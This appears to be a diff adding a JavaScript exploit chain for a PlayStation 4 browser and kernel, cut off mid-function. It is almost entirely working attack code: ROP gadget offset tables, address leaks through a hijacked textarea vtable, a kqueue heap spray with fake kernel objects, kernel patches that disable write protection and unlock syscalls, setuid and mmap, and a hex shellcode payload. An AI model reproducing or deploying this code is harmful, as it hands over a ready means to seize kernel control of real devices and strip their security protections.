+var webKitBase;
+var webKitRequirementBase;
+var libSceLibcInternalBase;
+var libKernelBase;
+var textArea = document.createElement("textarea");
+var nogc = [];
+var syscalls = {};
+var gadgets = {};
+var wk_gadgetmap = {"ret": 0x32,"pop rdi": 0x319690,"pop rsi": 0x1F4D6,"pop rdx": 0x986C,"pop rcx": 0x657B7,"pop r8": 0xAFAA71,"pop r9": 0x422571,"pop rax": 0x51A12,"pop rsp": 0x4E293,"mov [rdi], rsi": 0x1A97920,"mov [rdi], rax": 0x10788F7,"mov [rdi], eax": 0x9964BC,"cli ; pop rax": 0x566F8,"sti": 0x1FBBCC,"mov rax, [rax]": 0x241CC,"mov rax, [rsi]": 0x5106A0,"mov [rax], rsi": 0x1EFD890,"mov [rax], rdx": 0x1426A82,"mov [rax], edx": 0x3B7FE4,"add rax, rsi": 0x170397E,"mov rdx, rax": 0x53F501,"add rax, rcx": 0x2FBCD,"mov rsp, rdi": 0x2048062,"mov rdi, [rax + 8] ; call [rax]": 0x751EE7,"infloop": 0x7DFF,"mov [rax], cl": 0xC6EAF};
+var wkr_gadgetmap = {"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0};
+var wk2_gadgetmap = {"mov [rax], rdi": 0xFFDD7,"mov [rax], rcx": 0x2C9ECA,"mov [rax], cx": 0x15A7D52};
+var hmd_gadgetmap = {"add [r8], r12": 0x2BCE1};
+var ipmi_gadgetmap = {"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B};
+
+function run_hax() {
+    userland();
+    if (chain.syscall(23, 0).low != 0x0) {
+        kernel();
+    }
+    else {
+    sessionStorage.Exploit="yes";
+    load_pocj();
+    }
+}
+
+function int64(low, hi) {
+ this.low = (low >>> 0);
+ this.hi = (hi >>> 0);
+ this.add32inplace = function (val) {
+  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo < this.low) {
+   new_hi++;
+  }
+  this.hi = new_hi;
+  this.low = new_lo;
+ };
+ this.add32 = function (val) {
+  var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo < this.low) {
+   new_hi++;
+  }
+  return new int64(new_lo, new_hi);
+ };
+ this.sub32 = function (val) {
+  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo > (this.low) & 0xFFFFFFFF) {
+   new_hi--;
+  }
+  return new int64(new_lo, new_hi);
+ };
+ this.sub32inplace = function (val) {
+  var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+  var new_hi = (this.hi >>> 0);
+  if (new_lo > (this.low) & 0xFFFFFFFF) {
+   new_hi--;
+  }
+  this.hi = new_hi;
+  this.low = new_lo;
+ };
+ this.and32 = function (val) {
+  var new_lo = this.low & val;
+  var new_hi = this.hi;
+  return new int64(new_lo, new_hi);
+ };
+ this.and64 = function (vallo, valhi) {
+  var new_lo = this.low & vallo;
+  var new_hi = this.hi & valhi;
+  return new int64(new_lo, new_hi);
+ };
+ function zeroFill(number, width) {
+  width -= number.toString().length;
+  if (width > 0) {
+   return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+  }
+  return number + "";
+ }
+ this.toString = function (val) {
+  val = 16;
+  var lo_str = (this.low >>> 0).toString(val);
+  var hi_str = (this.hi >>> 0).toString(val);
+  if (this.hi == 0)
+   return lo_str;
+  else
+   lo_str = zeroFill(lo_str, 8);
+  return hi_str + lo_str;
+ };
+ return this;
+}
+
+window.rop = function () {
+ const stack_sz = 0x40000;
+ const reserve_upper_stack = 0x10000;
+ const stack_reserved_idx = reserve_upper_stack / 4;
+ this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+ this.stack = this.stackback.add32(reserve_upper_stack);
+ this.stack_array = this.stackback.backing;
+ this.retval = this.stackback.add32(stack_sz);
+ this.count = 1;
+ this.branches_count = 0;
+ this.branches_rsps = p.malloc(0x200);
+ this.clear = function () {
+  this.count = 1;
+  this.branches_count = 0;
+  for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+   this.stack_array[i + stack_reserved_idx] = 0;
+  }
+ };
+ this.pushSymbolic = function () {
+  this.count++;
+  return this.count - 1;
+ };
+ this.finalizeSymbolic = function (idx, val) {
+  if (val instanceof int64) {
+   this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+   this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+  } else {
+   this.stack_array[stack_reserved_idx + idx * 2] = val;
+   this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+  }
+ };
+ this.push = function (val) {
+  this.finalizeSymbolic(this.pushSymbolic(), val);
+ };
+ this.push_write8 = function (where, what) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["pop rsi"]);
+  this.push(what);
+  this.push(gadgets["mov [rdi], rsi"]);
+ };
+ this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+  if (rdi != undefined) {
+   this.push(gadgets["pop rdi"]);
+   this.push(rdi);
+  }
+  if (rsi != undefined) {
+   this.push(gadgets["pop rsi"]);
+   this.push(rsi);
+  }
+  if (rdx != undefined) {
+   this.push(gadgets["pop rdx"]);
+   this.push(rdx);
+  }
+  if (rcx != undefined) {
+   this.push(gadgets["pop rcx"]);
+   this.push(rcx);
+  }
+  if (r8 != undefined) {
+   this.push(gadgets["pop r8"]);
+   this.push(r8);
+  }
+  if (r9 != undefined) {
+   this.push(gadgets["pop r9"]);
+   this.push(r9);
+  }
+  if (this.stack.add32(this.count * 0x8).low & 0x8) {
+   this.push(gadgets["ret"]);
+  }
+  this.push(rip);
+  return this;
+ };
+ this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+  this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+  this.write_result(this.retval);
+  this.run();
+  return p.read8(this.retval);
+ };
+ this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
+  return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+ };
+ this.get_rsp = function () {
+  return this.stack.add32(this.count * 8);
+ };
+ this.write_result = function (where) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["mov [rdi], rax"]);
+ };
+ this.write_result4 = function (where) {
+  this.push(gadgets["pop rdi"]);
+  this.push(where);
+  this.push(gadgets["mov [rdi], eax"]);
+ };
+ this.jmp_rsp = function (rsp) {
+  this.push(window.gadgets["pop rsp"]);
+  this.push(rsp);
+ };
+ this.run = function () {
+  p.launch_chain(this);
+  this.clear();
+ };
+ this.KERNEL_BASE_PTR_VAR;
+ this.set_kernel_var = function (arg) {
+  this.KERNEL_BASE_PTR_VAR = arg;
+ };
+ this.rax_kernel = function (offset) {
+  this.push(gadgets["pop rax"]);
+  this.push(this.KERNEL_BASE_PTR_VAR);
+  this.push(gadgets["mov rax, [rax]"]);
+  this.push(gadgets["pop rsi"]);
+  this.push(offset);
+  this.push(gadgets["add rax, rsi"]);
+ };
+ this.write_kernel_addr_to_chain_later = function (offset) {
+  this.push(gadgets["pop rdi"]);
+  var idx = this.pushSymbolic();
+  this.rax_kernel(offset);
+  this.push(gadgets["mov [rdi], rax"]);
+  return idx;
+ };
+ this.kwrite8 = function (offset, qword) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rsi"]);
+  this.push(qword);
+  this.push(gadgets["mov [rax], rsi"]);
+ };
+ this.kwrite4 = function (offset, dword) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rdx"]);
+  this.push(dword);
+  this.push(gadgets["mov [rax], edx"]);
+ };
+ this.kwrite2 = function (offset, word) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rcx"]);
+  this.push(word);
+  this.push(gadgets["mov [rax], cx"]);
+ };
+ this.kwrite1 = function (offset, byte) {
+  this.rax_kernel(offset);
+  this.push(gadgets["pop rcx"]);
+  this.push(byte);
+  this.push(gadgets["mov [rax], cl"]);
+ };
+ this.kwrite8_kaddr = function (offset1, offset2) {
+  this.rax_kernel(offset2);
+  this.push(gadgets["mov rdx, rax"]);
+  this.rax_kernel(offset1);
+  this.push(gadgets["mov [rax], rdx"]);
+ };
+ return this;
+};
+
+function userland() {
+ p.launch_chain = launch_chain;
+ p.malloc = malloc;
+ p.malloc32 = malloc32;
+ p.stringify = stringify;
+ p.array_from_address = array_from_address;
+ p.readstr = readstr;
+ var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+ var textAreaVtable = p.read8(textAreaVtPtr);
+ webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+ libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
+ libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
+ libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
+ libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
+ webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
+ webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
+ for (var gadget in wk_gadgetmap) {
+  window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
+ }
+ for (var gadget in wkr_gadgetmap) {
+  window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
+ }
+ function get_jmptgt(address) {
+  var instr = p.read4(address) & 0xFFFF;
+  var offset = p.read4(address.add32(2));
+  if (instr != 0x25FF) {
+   return 0;
+  }
+  return address.add32(0x6 + offset);
+ }
+ function malloc(sz) {
+  var backing = new Uint8Array(0x10000 + sz);
+  window.nogc.push(backing);
+  var ptr = p.read8(p.leakval(backing).add32(0x10));
+  ptr.backing = backing;
+  return ptr;
+ }
+ function malloc32(sz) {
+  var backing = new Uint8Array(0x10000 + sz * 4);
+  window.nogc.push(backing);
+  var ptr = p.read8(p.leakval(backing).add32(0x10));
+  ptr.backing = new Uint32Array(backing.buffer);
+  return ptr;
+ }
+ function array_from_address(addr, size) {
+  var og_array = new Uint32Array(0x1000);
+  var og_array_i = p.leakval(og_array).add32(0x10);
+  p.write8(og_array_i, addr);
+  p.write4(og_array_i.add32(0x8), size);
+  p.write4(og_array_i.add32(0xC), 0x1);
+  nogc.push(og_array);
+  return og_array;
+ }
+ function stringify(str) {
+  var bufView = new Uint8Array(str.length + 1);
+  for (var i = 0; i < str.length; i++) {
+   bufView[i] = str.charCodeAt(i) & 0xFF;
+  }
+  window.nogc.push(bufView);
+  return p.read8(p.leakval(bufView).add32(0x10));
+ }
+ function readstr(addr) {
+  var str = "";
+  for (var i = 0; ; i++) {
+   var c = p.read1(addr.add32(i));
+   if (c == 0x0) {
+    break;
+   }
+   str += String.fromCharCode(c);
+  }
+  return str;
+ }
+ var fakeVtable_setjmp = p.malloc32(0x200);
+ var fakeVtable_longjmp = p.malloc32(0x200);
+ var original_context = p.malloc32(0x40);
+ var modified_context = p.malloc32(0x40);
+ p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
+ p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
+ p.write8(fakeVtable_setjmp.add32(0x10), original_context);
+ p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
+ p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
+ p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
+ p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
+ p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
+ p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+ p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
+ function launch_chain(chain) {
+  chain.push(window.gadgets["pop rdi"]);
+  chain.push(original_context);
+  chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+  p.write8(textAreaVtPtr, fakeVtable_setjmp);
+  textArea.scrollLeft = 0x0;
+  p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
+  p.write8(modified_context.add32(0x10), chain.stack);
+  p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)));
+  p.write8(textAreaVtPtr, fakeVtable_longjmp);
+  textArea.scrollLeft = 0x0;
+  p.write8(textAreaVtPtr, textAreaVtable);
+ }
+ var kview = new Uint8Array(0x1000);
+ var kstr = p.leakval(kview).add32(0x10);
+ var orig_kview_buf = p.read8(kstr);
+ p.write8(kstr, window.libKernelBase);
+ p.write4(kstr.add32(8), 0x40000);
+ var countbytes;
+ for (var i = 0; i < 0x40000; i++) {
+  if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
+   countbytes = i;
+   break;
+  }
+ }
+ p.write4(kstr.add32(8), countbytes + 32);
+ var dview32 = new Uint32Array(1);
+ var dview8 = new Uint8Array(dview32.buffer);
+ for (var i = 0; i < countbytes; i++) {
+  if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
+   dview8[0] = kview[i + 3];
+   dview8[1] = kview[i + 4];
+   dview8[2] = kview[i + 5];
+   dview8[3] = kview[i + 6];
+   var syscallno = dview32[0];
+   window.syscalls[syscallno] = window.libKernelBase.add32(i);
+  }
+ }
+ p.write8(kstr, orig_kview_buf);
+ chain = new rop();
+ if (chain.syscall(20).low == 0) {
+  alert("Webkit Exploit Failed. Try Again.");
+  while (1);
+ }
+}
+
+function kernel() {
+ var handle;
+ var random_path;
+ var ex_info;
+
+ function load_prx(name) {
+  var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
+  if (res.low != 0x0) {
+   alert("failed to load prx/get handle " + name);
+  }
+  p.write8(ex_info, 0x1A8);
+  res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
+  if (res.low != 0x0) {
+   alert("failed to get module info from handle");
+  }
+  var tlsinit = p.read8(ex_info.add32(0x110));
+  var tlssize = p.read4(ex_info.add32(0x11C));
+  if (tlssize != 0) {
+   if (name == "libSceWebKit2.sprx") {
+    tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
+   } else {
+    alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
+   }
+  };
+  return tlsinit;
+ }
+ 
+ function extra_gadgets() {
+  handle = p.malloc(0x1E8);
+  var randomized_path_length_ptr = handle.add32(0x4);
+  var randomized_path_ptr = handle.add32(0x14);
+  ex_info = randomized_path_ptr.add32(0x40);
+  p.write8(randomized_path_length_ptr, 0x2C);
+  chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
+  random_path = p.readstr(randomized_path_ptr);
+  var ipmi_addr = load_prx("libSceIpmi.sprx");
+  var hmd_addr = load_prx("libSceHmd.sprx");
+  var wk2_addr = load_prx("libSceWebKit2.sprx");
+  for (var gadget in hmd_gadgetmap) {
+   window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
+  }
+  for (var gadget in wk2_gadgetmap) {
+   window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
+  }
+  for (var gadget in ipmi_gadgetmap) {
+   window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
+  }
+  for (var gadget in window.gadgets) {
+   p.read8(window.gadgets[gadget]);
+   chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
+  }
+  chain.run();
+ }
+ 
+ function kchain_setup() {
+  const KERNEL_busy = 0x1B28DF8;
+  const KERNEL_bcopy = 0xACD;
+  const KERNEL_bzero = 0x2713FD;
+  const KERNEL_pagezero = 0x271441;
+  const KERNEL_memcpy = 0x2714BD;
+  const KERNEL_pagecopy = 0x271501;
+  const KERNEL_copyin = 0x2716AD;
+  const KERNEL_copyinstr = 0x271B5D;
+  const KERNEL_copystr = 0x271C2D;
+  const KERNEL_setidt = 0x312c40;
+  const KERNEL_setcr0 = 0x1FB949;
+  const KERNEL_Xill = 0x17d500;
+  const KERNEL_veriPatch = 0x626874;
+  const KERNEL_enable_syscalls_1 = 0x490;
+  const KERNEL_enable_syscalls_2 = 0x4B5;
+  const KERNEL_enable_syscalls_3 = 0x4B9;
+  const KERNEL_enable_syscalls_4 = 0x4C2;
+  const KERNEL_mprotect = 0x80B8D;
+  const KERNEL_prx = 0x23AEC4;
+  const KERNEL_dlsym_1 = 0x23B67F;
+  const KERNEL_dlsym_2 = 0x221b40;
+  const KERNEL_setuid = 0x1A06;
+  const KERNEL_syscall11_1 = 0x1100520;
+  const KERNEL_syscall11_2 = 0x1100528;
+  const KERNEL_syscall11_3 = 0x110054C;
+  const KERNEL_syscall11_gadget = 0x4c7ad;
+  const KERNEL_mmap_1 = 0x16632A;
+  const KERNEL_mmap_2 = 0x16632D;
+  const KERNEL_setcr0_patch = 0x3ade3B;
+  const KERNEL_kqueue_close_epi = 0x398991;
+  SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
+  KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
+  p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
+  kchain = new rop();
+  kchain2 = new rop(); {
+   chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
+   chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
+   chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
+  }
+  chain.run();
+  kchain.count = 0;
+  kchain2.count = 0;
+  kchain.set_kernel_var(KERNEL_BASE_PTR);
+  kchain2.set_kernel_var(KERNEL_BASE_PTR);
+  kchain.push(gadgets["pop rax"]);
+  kchain.push(SAVED_KERNEL_STACK_PTR);
+  kchain.push(gadgets["mov [rax], rdi"]);
+  kchain.push(gadgets["pop r8"]);
+  kchain.push(KERNEL_BASE_PTR);
+  kchain.push(gadgets["add [r8], r12"]);
+  kchain.kwrite1(KERNEL_busy, 0x1);
+  kchain.push(gadgets["sti"]);
+  var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
+  var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
+  kchain.push(gadgets["pop rdi"]);
+  kchain.push(0x6);
+  kchain.push(gadgets["pop rsi"]);
+  kchain.push(gadgets["mov rsp, rdi"]);
+  kchain.push(gadgets["pop rdx"]);
+  kchain.push(0xE);
+  kchain.push(gadgets["pop rcx"]);
+  kchain.push(0x0);
+  kchain.push(gadgets["pop r8"]);
+  kchain.push(0x0);
+  var idx1_dest = kchain.get_rsp();
+  kchain.pushSymbolic();
+  kchain.push(gadgets["pop rsi"]);
+  kchain.push(0x80040033);
+  kchain.push(gadgets["pop rdi"]);
+  kchain.push(kchain2.stack);
+  var idx2_dest = kchain.get_rsp();
+  kchain.pushSymbolic();
+  kchain.finalizeSymbolic(idx1, idx1_dest);
+  kchain.finalizeSymbolic(idx2, idx2_dest);
+  kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
+  kchain2.kwrite1(KERNEL_bcopy, 0xEB);
+  kchain2.kwrite1(KERNEL_bzero, 0xEB);
+  kchain2.kwrite1(KERNEL_pagezero, 0xEB);
+  kchain2.kwrite1(KERNEL_memcpy, 0xEB);
+  kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
+  kchain2.kwrite1(KERNEL_copyin, 0xEB);
+  kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
+  kchain2.kwrite1(KERNEL_copystr, 0xEB);
+  kchain2.kwrite1(KERNEL_busy, 0x0);
+  var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
+  var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
+  kchain2.push(gadgets["pop rdi"]);
+  kchain2.push(0x6);
+  kchain2.push(gadgets["pop rsi"]);
+  var idx3_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.push(gadgets["pop rdx"]);
+  kchain2.push(0xE);
+  kchain2.push(gadgets["pop rcx"]);
+  kchain2.push(0x0);
+  kchain2.push(gadgets["pop r8"]);
+  kchain2.push(0x0);
+  var idx4_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx3, idx3_dest);
+  kchain2.finalizeSymbolic(idx4, idx4_dest);
+  kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
+  kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
+  kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
+  kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
+  kchain2.kwrite1(KERNEL_setuid, 0xEB);
+  kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
+  kchain2.kwrite2(KERNEL_prx, 0xE990);
+  kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
+  kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
+  kchain2.kwrite1(KERNEL_mmap_1, 0x37);
+  kchain2.kwrite1(KERNEL_mmap_2, 0x37);
+  kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
+  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
+  kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
+  kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
+  var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
+  kchain2.push(gadgets["pop rdi"]);
+  kchain2.push(0x80050033);
+  var idx5_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx5, idx5_dest);
+  kchain2.rax_kernel(KERNEL_kqueue_close_epi);
+  kchain2.push(gadgets["mov rdx, rax"]);
+  kchain2.push(gadgets["pop rsi"]);
+  kchain2.push(SAVED_KERNEL_STACK_PTR);
+  kchain2.push(gadgets["mov rax, [rsi]"]);
+  kchain2.push(gadgets["pop rcx"]);
+  kchain2.push(0x10);
+  kchain2.push(gadgets["add rax, rcx"]);
+  kchain2.push(gadgets["mov [rax], rdx"]);
+  kchain2.push(gadgets["pop rdi"]);
+  var idx6 = kchain2.pushSymbolic();
+  kchain2.push(gadgets["mov [rdi], rax"]);
+  kchain2.push(gadgets["sti"]);
+  kchain2.push(gadgets["pop rsp"]);
+  var idx6_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx6, idx6_dest);
+ }
+ 
+ function object_setup() {
+  var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
+  var fake_filtops = fake_knote.add32(0x4000);
+  var fake_obj = fake_knote.add32(0x8000);
+  if (fake_knote.low != 0x4000) {
+   alert("enomem: " + fake_knote);
+   while (1);
+  } {
+   p.write8(fake_knote, fake_obj);
+   p.write8(fake_knote.add32(0x68), fake_filtops);
+  } {
+   p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
+   p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
+   p.write8(fake_filtops.add32(0x8), kchain.stack);
+   p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);
+  } {
+   p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
+  }
+  chain.syscall(203, fake_knote, 0xC000);
+ }
+ 
+ var trigger_spray = function () {
+  var NUM_KQUEUES = 0x1B0;
+  var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4); {
+   for (var i = 0; i < NUM_KQUEUES; i++) {
+    chain.fcall(window.syscalls[362]);
+    chain.write_result4(kqueue_ptr.add32(0x4 * i));
+   }
+  }
+  chain.run();
+  var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
+  var that_one_socket = chain.syscall(97, 2, 1, 0);
+  if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
+   alert("invalid socket");
+   while (1);
+  }
+  var kevent = p.malloc(0x20);
+  p.write8(kevent.add32(0x0), that_one_socket);
+  p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
+  p.write4(kevent.add32(0xC), 0x0);
+  p.write8(kevent.add32(0x10), 0x0);
+  p.write8(kevent.add32(0x18), 0x0); {
+   for (var i = 0; i < NUM_KQUEUES; i++) {
+    chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
+   }
+  }
+  chain.run(); {
+   for (var i = 18; i < NUM_KQUEUES; i += 2) {
+    chain.fcall(window.syscalls[6], kqueues[i]);
+   }
+  }
+  chain.run(); 
+  alert("🤏 Insert USB Drive 🙂\n\n\n❗Wait 10 seconds ❗\n\n\n⛔and click OK after seeing the pop-up notification⛔");
+  {
+   for (var i = 1; i < NUM_KQUEUES; i += 2) {
+    chain.fcall(window.syscalls[6], kqueues[i]);
+   }
+  }
+  chain.run();
+  if (chain.syscall(23, 0).low == 0) {
+			
+            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
+            chain.fcall(window.syscalls[325]);
+            chain.run();
+
+            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
+            for(var i=0; i < PatchPl.length; i++)
+            {
+              patch_buffer_view[i] = PatchPl[i];
+            }
+            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
+            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
+            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
+            chain.run();
+        alert("✅ Now remove the USB drive and click OK 💯");
